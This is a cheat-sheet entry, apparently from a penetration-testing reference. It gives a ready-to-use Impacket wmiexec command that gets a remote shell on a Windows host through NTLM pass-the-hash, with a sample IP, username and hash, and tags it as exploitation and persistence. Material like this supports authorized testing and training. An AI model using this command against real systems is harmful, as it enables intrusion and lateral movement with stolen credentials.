---
description: Execute commands remotely over WMI on a Windows host using Impacket's wmiexec with NTLM Pass-the-Hash.

Command Reference:
    Target IP: 10.10.10.1
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  impacket-wmiexec -hashes 00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396 john@10.10.10.1

items:
  - Hash
  - Shell
  - PowerShell

services:
  - WMI
  - NTLM

OS:
  - Windows

attack_types:
  - Exploitation
  - Persistence

references:
  - https://github.com/fortra/impacket
---
